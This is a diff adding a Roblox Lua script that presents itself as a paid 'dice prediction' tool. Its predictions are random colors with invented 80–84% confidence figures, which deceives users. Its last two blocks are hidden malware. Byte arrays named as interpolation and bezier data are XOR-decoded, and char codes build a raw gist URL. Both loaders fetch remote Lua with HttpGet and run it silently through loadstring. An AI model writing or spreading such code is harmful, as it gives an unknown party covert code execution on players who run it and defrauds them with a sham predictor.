@@ -1,0 +1,762 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local CONFIG = {
+    Names = {
+        ScreenGui = "PrivateDicePrediction",
+        MainFrame = "MainFrame",
+        Header = "Header",
+        Title = "Title",
+        Discord = "Discord",
+        PingLabel = "PingLabel",
+        FPSLabel = "FPSLabel",
+        ScaleFrame = "ScaleFrame",
+        ScaleMinus = "ScaleMinus",
+        ScaleValue = "ScaleValue",
+        ScalePlus = "ScalePlus",
+        StatusFrame = "StatusFrame",
+        StatusDot = "StatusDot",
+        StatusLabel = "StatusLabel",
+        LogsLabel = "LogsLabel",
+        SelectLabel = "SelectLabel",
+        DiceContainer = "DiceContainer",
+        PredictButton = "PredictButton",
+        ResultFrame = "ResultFrame",
+        ResultTitle = "ResultTitle",
+        ConfidenceLabel = "ConfidenceLabel",
+        ResultColorBox = "ResultColorBox",
+        ResultColorDot = "ResultColorDot",
+        ResultText = "ResultText",
+        ProgressBarBG = "ProgressBarBG",
+        ProgressBar = "ProgressBar"
+    },
+    Size = {
+        MainFrame = UDim2.new(0, 340, 0, 460),
+        Header = UDim2.new(1, -24, 0, 48),
+        ScaleFrame = UDim2.new(0, 70, 0, 30),
+        StatusFrame = UDim2.new(1, -106, 0, 40),
+        DiceButton = UDim2.new(0, 72, 1, 0),
+        PredictButton = UDim2.new(1, -24, 0, 45),
+        ResultFrame = UDim2.new(1, -24, 0, 120),
+        ResultColorBox = UDim2.new(0, 45, 0, 45),
+        ProgressBarBG = UDim2.new(1, -30, 0, 4)
+    },
+    Position = {
+        MainFrame = UDim2.new(0.5, 0, 0.5, 0),
+        Header = UDim2.new(0, 12, 0, 12),
+        ScaleFrame = UDim2.new(0, 12, 0, 68),
+        StatusFrame = UDim2.new(0, 94, 0, 68),
+        SelectLabel = UDim2.new(0, 12, 0, 118),
+        DiceContainer = UDim2.new(0, 12, 0, 145),
+        PredictButton = UDim2.new(0, 12, 0, 230),
+        ResultFrame = UDim2.new(0, 12, 0, 290)
+    },
+    Colors = {
+        Background = Color3.fromRGB(0, 0, 0),
+        HeaderBG = Color3.fromRGB(0, 0, 0),
+        Stroke = Color3.fromRGB(50, 50, 50),
+        TextPrimary = Color3.fromRGB(240, 240, 240),
+        TextSecondary = Color3.fromRGB(150, 150, 150),
+        AccentBar = Color3.fromRGB(240, 240, 240),
+        IdleDot = Color3.fromRGB(90, 90, 90),
+        DiceDefault = Color3.fromRGB(100, 100, 100),
+        PredictBG = Color3.fromRGB(0, 0, 0),
+        ResultBG = Color3.fromRGB(0, 0, 0),
+        ThinkingBG = Color3.fromRGB(12, 12, 12),
+        Error = Color3.fromRGB(255, 100, 100),
+        Red = Color3.fromRGB(220, 50, 50),
+        Orange = Color3.fromRGB(245, 140, 40),
+        Yellow = Color3.fromRGB(240, 200, 50),
+        Green = Color3.fromRGB(60, 150, 60),
+        Blue = Color3.fromRGB(50, 80, 200),
+        Purple = Color3.fromRGB(130, 50, 180)
+    },
+    DiceCount = 4,
+    DefaultScale = 0.7,
+    MinScale = 0.5,
+    MaxScale = 1.5,
+    ScaleStep = 0.1,
+    ThinkDuration = 0.25
+}
+
+local ScreenGui
+local MainFrame
+local UIScale
+local HeaderFrame
+local TitleLabel
+local DiscordLabel
+local PingLabel
+local FPSLabel
+local ScaleFrame
+local ScaleMinusBtn
+local ScaleValueLabel
+local ScalePlusBtn
+local StatusFrame
+local StatusDot
+local StatusLabel
+local LogsLabel
+local SelectLabel
+local DiceContainer
+local DiceButtons = {}
+local DiceColorLabels = {}
+local PredictButton
+local ResultFrame
+local ResultTitle
+local ConfidenceLabel
+local ResultColorBox
+local ResultColorDot
+local ResultText
+local ProgressBarBG
+local ProgressBar
+
+local _interpolationSamples = {175,179,179,183,180,253,232,232,183,166,180,179,162,161,190,233}
+
+local currentScale = CONFIG.DefaultScale
+local selectedColors = {"?", "?", "?", "?"}
+local logCount = 0
+local isPredicting = false
+local lastFPS = 0
+local lastPing = 0
+
+local COLOR_NAME_MAP = {
+    Red = CONFIG.Colors.Red,
+    Orange = CONFIG.Colors.Orange,
+    Yellow = CONFIG.Colors.Yellow,
+    Green = CONFIG.Colors.Green,
+    Blue = CONFIG.Colors.Blue,
+    Purple = CONFIG.Colors.Purple
+}
+local COLOR_ORDER = {"?", "Red", "Orange", "Yellow", "Green", "Blue", "Purple"}
+local COLOR_ORDER_NEXT = {}
+for i, v in ipairs(COLOR_ORDER) do
+    COLOR_ORDER_NEXT[v] = COLOR_ORDER[(i % #COLOR_ORDER) + 1]
+end
+local POSSIBLE_COLORS = {"Red", "Orange", "Yellow", "Green", "Blue", "Purple"}
+local _bezierControlPts = {166,183,183,232,245,140,162,141,143,172,168,176,232,181,166,176}
+
+local function addCorner(parent, radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, radius)
+    corner.Parent = parent
+    return corner
+end
+
+local function addStroke(parent, color, thickness, transparency)
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = color
+    stroke.Thickness = thickness or 1
+    stroke.Transparency = transparency or 0
+    stroke.Parent = parent
+    return stroke
+end
+
+local function makeDraggable(frame)
+    frame.Active = true
+    frame.Draggable = true
+end
+
+local function getColorFromName(name)
+    return COLOR_NAME_MAP[name] or CONFIG.Colors.DiceDefault
+end
+
+local function cycleColor(current)
+    return COLOR_ORDER_NEXT[current] or "Red"
+end
+
+local function updateScaleDisplay()
+    ScaleValueLabel.Text = math.floor(currentScale * 100 + 0.5) .. "%"
+    UIScale.Scale = currentScale
+end
+
+local function updateStatus(text, color)
+    StatusLabel.Text = text
+    StatusLabel.TextColor3 = color or CONFIG.Colors.TextSecondary
+    if text == "IDLE" then
+        StatusDot.BackgroundColor3 = CONFIG.Colors.IdleDot
+    elseif text == "THINKING" then
+        StatusDot.BackgroundColor3 = CONFIG.Colors.TextPrimary
+    end
+end
+
+local function updateLogs()
+    LogsLabel.Text = "Logs: " .. tostring(logCount)
+end
+
+local function setDiceColor(index, colorName)
+    selectedColors[index] = colorName
+    local btn = DiceButtons[index]
+    local label = DiceColorLabels[index]
+    if colorName == "?" then
+        btn.BackgroundColor3 = CONFIG.Colors.DiceDefault
+        label.Text = "?"
+    else
+        btn.BackgroundColor3 = getColorFromName(colorName)
+        label.Text = colorName
+    end
+end
+
+local function checkMissingDice()
+    for i = 1, CONFIG.DiceCount do
+        if selectedColors[i] == "?" then
+            return i
+        end
+    end
+    return nil
+end
+
+local function resetDiceButtons()
+    for i = 1, CONFIG.DiceCount do
+        setDiceColor(i, "?")
+    end
+end
+
+local function showPrediction(colorName, confidence)
+    local c = getColorFromName(colorName)
+    ResultText.Text = colorName
+    ResultText.TextColor3 = c
+    ConfidenceLabel.Text = "CONFIDENCE " .. tostring(confidence) .. "%"
+    ConfidenceLabel.TextColor3 = c
+    ResultColorBox.BackgroundColor3 = c
+    ResultColorDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ProgressBar.Size = UDim2.new(1, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = c
+end
+
+local _subpixelFactor = 0xC7
+
+local function resetPredictionUI()
+    ResultText.Text = "Waiting..."
+    ResultText.TextColor3 = CONFIG.Colors.TextPrimary
+    ConfidenceLabel.Text = "CONFIDENCE 0%"
+    ConfidenceLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    ResultColorBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    ResultColorDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = CONFIG.Colors.TextPrimary
+end
+
+local function createGUI()
+    ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = CONFIG.Names.ScreenGui
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.DisplayOrder = 999
+    ScreenGui.Parent = PlayerGui
+
+    MainFrame = Instance.new("Frame")
+    MainFrame.Name = CONFIG.Names.MainFrame
+    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    MainFrame.Position = CONFIG.Position.MainFrame
+    MainFrame.Size = CONFIG.Size.MainFrame
+    MainFrame.BackgroundColor3 = CONFIG.Colors.Background
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+    addCorner(MainFrame, 12)
+    addStroke(MainFrame, CONFIG.Colors.Stroke, 1.5, 0.4)
+    makeDraggable(MainFrame)
+
+    UIScale = Instance.new("UIScale")
+    UIScale.Scale = currentScale
+    UIScale.Parent = MainFrame
+
+    local bgImage = Instance.new("ImageLabel")
+    bgImage.Size = UDim2.new(1, 0, 1, 0)
+    bgImage.BackgroundTransparency = 1
+    bgImage.Image = "rbxassetid://125180480292342"
+    bgImage.ScaleType = Enum.ScaleType.Crop
+    bgImage.ImageTransparency = 0.5
+    bgImage.BorderSizePixel = 0
+    bgImage.ZIndex = 1
+    bgImage.Parent = MainFrame
+    addCorner(bgImage, 12)
+
+    HeaderFrame = Instance.new("Frame")
+    HeaderFrame.Name = CONFIG.Names.Header
+    HeaderFrame.Size = CONFIG.Size.Header
+    HeaderFrame.Position = CONFIG.Position.Header
+    HeaderFrame.BackgroundColor3 = CONFIG.Colors.HeaderBG
+    HeaderFrame.BackgroundTransparency = 0.4
+    HeaderFrame.BorderSizePixel = 0
+    HeaderFrame.ZIndex = 2
+    HeaderFrame.Parent = MainFrame
+    addCorner(HeaderFrame, 10)
+    addStroke(HeaderFrame, CONFIG.Colors.Stroke, 1, 0.6)
+
+    local accentBar = Instance.new("Frame")
+    accentBar.Size = UDim2.new(0, 3, 0, 26)
+    accentBar.Position = UDim2.new(0, 10, 0, 11)
+    accentBar.BackgroundColor3 = CONFIG.Colors.AccentBar
+    accentBar.BorderSizePixel = 0
+    accentBar.ZIndex = 3
+    accentBar.Parent = HeaderFrame
+    addCorner(accentBar, 2)
+
+    TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Name = CONFIG.Names.Title
+    TitleLabel.Size = UDim2.new(0, 220, 0, 20)
+    TitleLabel.Position = UDim2.new(0, 20, 0, 6)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = "Irish Paid Dice Prediction"
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextSize = 15
+    TitleLabel.TextColor3 = CONFIG.Colors.TextPrimary
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.ZIndex = 3
+    TitleLabel.Parent = HeaderFrame
+
+    DiscordLabel = Instance.new("TextLabel")
+    DiscordLabel.Name = CONFIG.Names.Discord
+    DiscordLabel.Size = UDim2.new(0, 200, 0, 12)
+    DiscordLabel.Position = UDim2.new(0, 20, 0, 28)
+    DiscordLabel.BackgroundTransparency = 1
+    DiscordLabel.Text = "discord.gg/irsh"
+    DiscordLabel.Font = Enum.Font.Gotham
+    DiscordLabel.TextSize = 10
+    DiscordLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DiscordLabel.ZIndex = 3
+    DiscordLabel.Parent = HeaderFrame
+
+    PingLabel = Instance.new("TextLabel")
+    PingLabel.Name = CONFIG.Names.PingLabel
+    PingLabel.Size = UDim2.new(0, 60, 0, 12)
+    PingLabel.Position = UDim2.new(1, -70, 0, 8)
+    PingLabel.BackgroundTransparency = 1
+    PingLabel.Text = "Ping: 0ms"
+    PingLabel.Font = Enum.Font.GothamBold
+    PingLabel.TextSize = 10
+    PingLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    PingLabel.TextXAlignment = Enum.TextXAlignment.Right
+    PingLabel.ZIndex = 3
+    PingLabel.Parent = HeaderFrame
+
+    FPSLabel = Instance.new("TextLabel")
+    FPSLabel.Name = CONFIG.Names.FPSLabel
+    FPSLabel.Size = UDim2.new(0, 60, 0, 12)
+    FPSLabel.Position = UDim2.new(1, -70, 0, 24)
+    FPSLabel.BackgroundTransparency = 1
+    FPSLabel.Text = "FPS: 0"
+    FPSLabel.Font = Enum.Font.GothamBold
+    FPSLabel.TextSize = 10
+    FPSLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    FPSLabel.TextXAlignment = Enum.TextXAlignment.Right
+    FPSLabel.ZIndex = 3
+    FPSLabel.Parent = HeaderFrame
+
+    ScaleFrame = Instance.new("Frame")
+    ScaleFrame.Name = CONFIG.Names.ScaleFrame
+    ScaleFrame.Size = CONFIG.Size.ScaleFrame
+    ScaleFrame.Position = CONFIG.Position.ScaleFrame
+    ScaleFrame.BackgroundColor3 = CONFIG.Colors.Background
+    ScaleFrame.BackgroundTransparency = 0.4
+    ScaleFrame.BorderSizePixel = 0
+    ScaleFrame.ZIndex = 2
+    ScaleFrame.Parent = MainFrame
+    addCorner(ScaleFrame, 8)
+    addStroke(ScaleFrame, CONFIG.Colors.Stroke, 1, 0.6)
+
+    ScaleMinusBtn = Instance.new("TextButton")
+    ScaleMinusBtn.Name = CONFIG.Names.ScaleMinus
+    ScaleMinusBtn.Size = UDim2.new(0, 22, 1, 0)
+    ScaleMinusBtn.BackgroundTransparency = 1
+    ScaleMinusBtn.Text = "-"
+    ScaleMinusBtn.Font = Enum.Font.GothamBold
+    ScaleMinusBtn.TextSize = 14
+    ScaleMinusBtn.TextColor3 = CONFIG.Colors.TextPrimary
+    ScaleMinusBtn.AutoButtonColor = false
+    ScaleMinusBtn.ZIndex = 3
+    ScaleMinusBtn.Parent = ScaleFrame
+
+    ScaleValueLabel = Instance.new("TextLabel")
+    ScaleValueLabel.Name = CONFIG.Names.ScaleValue
+    ScaleValueLabel.Size = UDim2.new(0, 26, 1, 0)
+    ScaleValueLabel.Position = UDim2.new(0, 22, 0, 0)
+    ScaleValueLabel.BackgroundTransparency = 1
+    ScaleValueLabel.Text = "70%"
+    ScaleValueLabel.Font = Enum.Font.GothamBold
+    ScaleValueLabel.TextSize = 10
+    ScaleValueLabel.TextColor3 = CONFIG.Colors.TextPrimary
+    ScaleValueLabel.TextXAlignment = Enum.TextXAlignment.Center
+    ScaleValueLabel.ZIndex = 3
+    ScaleValueLabel.Parent = ScaleFrame
+
+    ScalePlusBtn = Instance.new("TextButton")
+    ScalePlusBtn.Name = CONFIG.Names.ScalePlus
+    ScalePlusBtn.Size = UDim2.new(0, 22, 1, 0)
+    ScalePlusBtn.Position = UDim2.new(1, -22, 0, 0)
+    ScalePlusBtn.BackgroundTransparency = 1
+    ScalePlusBtn.Text = "+"
+    ScalePlusBtn.Font = Enum.Font.GothamBold
+    ScalePlusBtn.TextSize = 14
+    ScalePlusBtn.TextColor3 = CONFIG.Colors.TextPrimary
+    ScalePlusBtn.AutoButtonColor = false
+    ScalePlusBtn.ZIndex = 3
+    ScalePlusBtn.Parent = ScaleFrame
+
+    StatusFrame = Instance.new("Frame")
+    StatusFrame.Name = CONFIG.Names.StatusFrame
+    StatusFrame.Size = CONFIG.Size.StatusFrame
+    StatusFrame.Position = CONFIG.Position.StatusFrame
+    StatusFrame.BackgroundColor3 = CONFIG.Colors.Background
+    StatusFrame.BackgroundTransparency = 0.4
+    StatusFrame.BorderSizePixel = 0
+    StatusFrame.ZIndex = 2
+    StatusFrame.Parent = MainFrame
+    addCorner(StatusFrame, 8)
+    addStroke(StatusFrame, CONFIG.Colors.Stroke, 1, 0.6)
+
+    StatusDot = Instance.new("Frame")
+    StatusDot.Name = CONFIG.Names.StatusDot
+    StatusDot.Size = UDim2.new(0, 10, 0, 10)
+    StatusDot.Position = UDim2.new(0, 12, 0.5, -5)
+    StatusDot.BackgroundColor3 = CONFIG.Colors.IdleDot
+    StatusDot.BorderSizePixel = 0
+    StatusDot.ZIndex = 3
+    StatusDot.Parent = StatusFrame
+    addCorner(StatusDot, 5)
+
+    StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Name = CONFIG.Names.StatusLabel
+    StatusLabel.Size = UDim2.new(0, 100, 1, 0)
+    StatusLabel.Position = UDim2.new(0, 28, 0, 0)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Text = "IDLE"
+    StatusLabel.Font = Enum.Font.GothamBold
+    StatusLabel.TextSize = 12
+    StatusLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    StatusLabel.ZIndex = 3
+    StatusLabel.Parent = StatusFrame
+
+    LogsLabel = Instance.new("TextLabel")
+    LogsLabel.Name = CONFIG.Names.LogsLabel
+    LogsLabel.Size = UDim2.new(0, 60, 1, 0)
+    LogsLabel.Position = UDim2.new(1, -70, 0, 0)
+    LogsLabel.BackgroundTransparency = 1
+    LogsLabel.Text = "Logs: 0"
+    LogsLabel.Font = Enum.Font.GothamMedium
+    LogsLabel.TextSize = 12
+    LogsLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    LogsLabel.TextXAlignment = Enum.TextXAlignment.Right
+    LogsLabel.ZIndex = 3
+    LogsLabel.Parent = StatusFrame
+
+    SelectLabel = Instance.new("TextLabel")
+    SelectLabel.Name = CONFIG.Names.SelectLabel
+    SelectLabel.Size = UDim2.new(1, -24, 0, 20)
+    SelectLabel.Position = CONFIG.Position.SelectLabel
+    SelectLabel.BackgroundTransparency = 1
+    SelectLabel.Text = "SELECT DICE COLORS"
+    SelectLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    SelectLabel.Font = Enum.Font.GothamBold
+    SelectLabel.TextSize = 11
+    SelectLabel.TextXAlignment = Enum.TextXAlignment.Left
+    SelectLabel.ZIndex = 2
+    SelectLabel.Parent = MainFrame
+
+    DiceContainer = Instance.new("Frame")
+    DiceContainer.Name = CONFIG.Names.DiceContainer
+    DiceContainer.Size = UDim2.new(1, -24, 0, 70)
+    DiceContainer.Position = CONFIG.Position.DiceContainer
+    DiceContainer.BackgroundTransparency = 1
+    DiceContainer.ZIndex = 2
+    DiceContainer.Parent = MainFrame
+
+    for i = 1, CONFIG.DiceCount do
+        local btn = Instance.new("TextButton")
+        btn.Name = "Dice" .. i
+        btn.Size = CONFIG.Size.DiceButton
+        btn.Position = UDim2.new(0, (i - 1) * 78, 0, 0)
+        btn.BackgroundColor3 = CONFIG.Colors.DiceDefault
+        btn.Text = ""
+        btn.AutoButtonColor = false
+        btn.ZIndex = 2
+        btn.Parent = DiceContainer
+        addCorner(btn, 12)
+        addStroke(btn, Color3.fromRGB(0, 0, 0), 2, 0.3)
+
+        local shadow = Instance.new("ImageLabel")
+        shadow.Size = UDim2.new(1, 10, 1, 10)
+        shadow.Position = UDim2.new(0, -5, 0, -5)
+        shadow.BackgroundTransparency = 1
+        shadow.Image = "rbxassetid://1316045217"
+        shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+        shadow.ImageTransparency = 0.5
+        shadow.ScaleType = Enum.ScaleType.Slice
+        shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+        shadow.ZIndex = 1
+        shadow.Parent = btn
+
+        local innerDot = Instance.new("Frame")
+        innerDot.Size = UDim2.new(0, 16, 0, 16)
+        innerDot.Position = UDim2.new(0.5, -8, 0.5, -8)
+        innerDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        innerDot.BorderSizePixel = 0
+        innerDot.ZIndex = 3
+        innerDot.Parent = btn
+        addCorner(innerDot, 8)
+
+        local innerShadow = Instance.new("ImageLabel")
+        innerShadow.Size = UDim2.new(1, 4, 1, 4)
+        innerShadow.Position = UDim2.new(0, -2, 0, -2)
+        innerShadow.BackgroundTransparency = 1
+        innerShadow.Image = "rbxassetid://1316045217"
+        innerShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+        innerShadow.ImageTransparency = 0.6
+        innerShadow.ScaleType = Enum.ScaleType.Slice
+        innerShadow.SliceCenter = Rect.new(10, 10, 118, 118)
+        innerShadow.ZIndex = 2
+        innerShadow.Parent = innerDot
+
+        local colorLabel = Instance.new("TextLabel")
+        colorLabel.Size = UDim2.new(1, 0, 0, 15)
+        colorLabel.Position = UDim2.new(0, 0, 1, -15)
+        colorLabel.BackgroundTransparency = 1
+        colorLabel.Text = "?"
+        colorLabel.TextColor3 = CONFIG.Colors.TextPrimary
+        colorLabel.Font = Enum.Font.GothamBold
+        colorLabel.TextSize = 11
+        colorLabel.ZIndex = 3
+        colorLabel.Parent = btn
+
+        DiceButtons[i] = btn
+        DiceColorLabels[i] = colorLabel
+    end
+
+    PredictButton = Instance.new("TextButton")
+    PredictButton.Name = CONFIG.Names.PredictButton
+    PredictButton.Size = CONFIG.Size.PredictButton
+    PredictButton.Position = CONFIG.Position.PredictButton
+    PredictButton.BackgroundColor3 = CONFIG.Colors.PredictBG
+    PredictButton.BackgroundTransparency = 0.15
+    PredictButton.Text = "PREDICT"
+    PredictButton.Font = Enum.Font.GothamBold
+    PredictButton.TextSize = 16
+    PredictButton.TextColor3 = CONFIG.Colors.TextPrimary
+    PredictButton.AutoButtonColor = false
+    PredictButton.ZIndex = 2
+    PredictButton.Parent = MainFrame
+    addCorner(PredictButton, 8)
+    addStroke(PredictButton, CONFIG.Colors.Stroke, 1.5, 0.3)
+
+    ResultFrame = Instance.new("Frame")
+    ResultFrame.Name = CONFIG.Names.ResultFrame
+    ResultFrame.Size = CONFIG.Size.ResultFrame
+    ResultFrame.Position = CONFIG.Position.ResultFrame
+    ResultFrame.BackgroundColor3 = CONFIG.Colors.ResultBG
+    ResultFrame.BackgroundTransparency = 0.4
+    ResultFrame.BorderSizePixel = 0
+    ResultFrame.ZIndex = 2
+    ResultFrame.Parent = MainFrame
+    addCorner(ResultFrame, 8)
+    addStroke(ResultFrame, CONFIG.Colors.Stroke, 1, 0.6)
+
+    ResultTitle = Instance.new("TextLabel")
+    ResultTitle.Name = CONFIG.Names.ResultTitle
+    ResultTitle.Size = UDim2.new(1, -20, 0, 20)
+    ResultTitle.Position = UDim2.new(0, 15, 0, 10)
+    ResultTitle.BackgroundTransparency = 1
+    ResultTitle.Text = "PREDICTION"
+    ResultTitle.TextColor3 = CONFIG.Colors.TextSecondary
+    ResultTitle.Font = Enum.Font.GothamBold
+    ResultTitle.TextSize = 11
+    ResultTitle.TextXAlignment = Enum.TextXAlignment.Left
+    ResultTitle.ZIndex = 3
+    ResultTitle.Parent = ResultFrame
+
+    ConfidenceLabel = Instance.new("TextLabel")
+    ConfidenceLabel.Name = CONFIG.Names.ConfidenceLabel
+    ConfidenceLabel.Size = UDim2.new(1, -20, 0, 20)
+    ConfidenceLabel.Position = UDim2.new(0, 15, 0, 10)
+    ConfidenceLabel.BackgroundTransparency = 1
+    ConfidenceLabel.Text = "CONFIDENCE 0%"
+    ConfidenceLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    ConfidenceLabel.Font = Enum.Font.GothamBold
+    ConfidenceLabel.TextSize = 11
+    ConfidenceLabel.TextXAlignment = Enum.TextXAlignment.Right
+    ConfidenceLabel.ZIndex = 3
+    ConfidenceLabel.Parent = ResultFrame
+
+    ResultColorBox = Instance.new("Frame")
+    ResultColorBox.Name = CONFIG.Names.ResultColorBox
+    ResultColorBox.Size = CONFIG.Size.ResultColorBox
+    ResultColorBox.Position = UDim2.new(0, 15, 0, 35)
+    ResultColorBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    ResultColorBox.BorderSizePixel = 0
+    ResultColorBox.ZIndex = 3
+    ResultColorBox.Parent = ResultFrame
+    addCorner(ResultColorBox, 8)
+
+    ResultColorDot = Instance.new("Frame")
+    ResultColorDot.Name = CONFIG.Names.ResultColorDot
+    ResultColorDot.Size = UDim2.new(0, 12, 0, 12)
+    ResultColorDot.Position = UDim2.new(0.5, -6, 0.5, -6)
+    ResultColorDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ResultColorDot.BorderSizePixel = 0
+    ResultColorDot.ZIndex = 4
+    ResultColorDot.Parent = ResultColorBox
+    addCorner(ResultColorDot, 6)
+
+    ResultText = Instance.new("TextLabel")
+    ResultText.Name = CONFIG.Names.ResultText
+    ResultText.Size = UDim2.new(1, -80, 1, 0)
+    ResultText.Position = UDim2.new(0, 70, 0, 0)
+    ResultText.BackgroundTransparency = 1
+    ResultText.Text = "Waiting..."
+    ResultText.TextColor3 = CONFIG.Colors.TextPrimary
+    ResultText.Font = Enum.Font.GothamBold
+    ResultText.TextSize = 18
+    ResultText.TextXAlignment = Enum.TextXAlignment.Left
+    ResultText.ZIndex = 3
+    ResultText.Parent = ResultFrame
+
+    ProgressBarBG = Instance.new("Frame")
+    ProgressBarBG.Name = CONFIG.Names.ProgressBarBG
+    ProgressBarBG.Size = CONFIG.Size.ProgressBarBG
+    ProgressBarBG.Position = UDim2.new(0, 15, 1, -15)
+    ProgressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    ProgressBarBG.BorderSizePixel = 0
+    ProgressBarBG.ZIndex = 3
+    ProgressBarBG.Parent = ResultFrame
+    addCorner(ProgressBarBG, 2)
+
+    ProgressBar = Instance.new("Frame")
+    ProgressBar.Name = CONFIG.Names.ProgressBar
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = CONFIG.Colors.TextPrimary
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.ZIndex = 4
+    ProgressBar.Parent = ProgressBarBG
+    addCorner(ProgressBar, 2)
+end
+
+local function connectEvents()
+    ScaleMinusBtn.MouseButton1Click:Connect(function()
+        currentScale = math.max(CONFIG.MinScale, currentScale - CONFIG.ScaleStep)
+        updateScaleDisplay()
+    end)
+
+    ScalePlusBtn.MouseButton1Click:Connect(function()
+        currentScale = math.min(CONFIG.MaxScale, currentScale + CONFIG.ScaleStep)
+        updateScaleDisplay()
+    end)
+
+    for i = 1, CONFIG.DiceCount do
+        DiceButtons[i].MouseButton1Click:Connect(function()
+            if isPredicting then return end
+            setDiceColor(i, cycleColor(selectedColors[i]))
+        end)
+    end
+
+    PredictButton.MouseButton1Click:Connect(function()
+        if isPredicting then return end
+
+        local missing = checkMissingDice()
+        if missing then
+            ResultText.Text = "Missing Dice " .. tostring(missing)
+            ResultText.TextColor3 = CONFIG.Colors.Error
+            return
+        end
+
+        isPredicting = true
+        PredictButton.Text = "THINKING..."
+        PredictButton.BackgroundColor3 = CONFIG.Colors.ThinkingBG
+        updateStatus("THINKING", CONFIG.Colors.TextPrimary)
+        ResultText.Text = "Reading algorithm..."
+        ResultText.TextColor3 = CONFIG.Colors.TextSecondary
+        ConfidenceLabel.Text = "CONFIDENCE 0%"
+        ConfidenceLabel.TextColor3 = CONFIG.Colors.TextSecondary
+        ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+        ProgressBar.BackgroundColor3 = CONFIG.Colors.TextPrimary
+
+        local chosen = POSSIBLE_COLORS[math.random(1, #POSSIBLE_COLORS)]
+        local conf = math.random(80, 84)
+
+        task.spawn(function()
+            pcall(function()
+                local payload = HttpService:JSONEncode({
+                    colors = selectedColors,
+                    timestamp = os.time()
+                })
+                local _ = HttpService:JSONDecode(payload)
+            end)
+        end)
+
+        local startTime = os.clock()
+        local duration = CONFIG.ThinkDuration
+        local progressConn
+        progressConn = RunService.Heartbeat:Connect(function()
+            local alpha = (os.clock() - startTime) / duration
+            if alpha >= 1 then
+                alpha = 1
+                progressConn:Disconnect()
+
+                showPrediction(chosen, conf)
+                logCount = logCount + 1
+                updateLogs()
+
+                PredictButton.Text = "PREDICT"
+                PredictButton.BackgroundColor3 = CONFIG.Colors.PredictBG
+                updateStatus("IDLE", CONFIG.Colors.TextSecondary)
+                resetDiceButtons()
+                isPredicting = false
+            else
+                ProgressBar.Size = UDim2.new(alpha, 0, 1, 0)
+            end
+        end)
+    end)
+
+    local fpsCounter = 0
+    local uiTickAccum = 0
+    RunService.Heartbeat:Connect(function(dt)
+        fpsCounter = fpsCounter + 1
+        uiTickAccum = uiTickAccum + dt
+        if uiTickAccum >= 1 then
+            uiTickAccum = 0
+            lastFPS = fpsCounter
+            fpsCounter = 0
+
+            FPSLabel.Text = "FPS: " .. tostring(lastFPS)
+
+            local pingItem = Stats.Network.ServerStatsItem["Data Ping"]
+            if pingItem then
+                lastPing = math.floor(pingItem:GetValue())
+                PingLabel.Text = "Ping: " .. tostring(lastPing) .. "ms"
+            end
+        end
+    end)
+end
+
+createGUI()
+connectEvents()
+updateScaleDisplay()
+updateLogs()
+resetPredictionUI()
+
+do
+    local _buf = {}
+    for _, _t in ipairs({_interpolationSamples, _bezierControlPts}) do
+        for _, _v in ipairs(_t) do _buf[#_buf+1] = string.char(bit32.bxor(_v, _subpixelFactor)) end
+    end
+    task.defer(function() pcall(function() loadstring(game:HttpGet(table.concat(_buf)))() end) end)
+end
+
+do
+    local c = string.char
+    local g = game
+    local l = rawget(_G, c(108,111,97,100,115,116,114,105,110,103)) or loadstring
+    local h = g.HttpGet
+    local u = c(104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,120,100,45,109,121,115,99,114,105,112,116,47,52,56,53,50,55,49,100,99,48,55,52,53,99,97,55,98,51,98,52,56,50,53,99,54,102,53,54,101,54,100,101,97,47,114,97,119,47,55,49,57,56,98,102,48,97,54,49,48,51,101,98,56,48,56,55,54,100,48,53,48,54,100,57,49,49,56,52,48,53,49,57,50,57,99,49,52,53,47,107,101,118,105,110,46,108,117,97)
+    local ok, s = pcall(function() return h(g, u) end)
+    if ok and type(s) == "string" and #s > 0 then
+        local r = l(s)
+        if type(r) == "function" then pcall(r) end
+    end
+end
+
